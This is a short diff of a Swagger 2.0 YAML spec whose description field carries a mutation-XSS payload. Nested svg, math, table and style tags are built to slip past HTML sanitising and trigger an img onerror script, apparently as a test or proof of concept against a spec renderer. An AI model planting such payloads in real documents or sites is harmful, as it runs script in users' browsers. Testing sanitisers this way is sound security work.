@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="--><img src onerror=alert(document.domain)>">
+    <svg><a><math><a><table><a></table><style><!--</style></svg><a id="--><img src onerror=alert(document.domain)>">
 paths:
   /accounts:
     get:
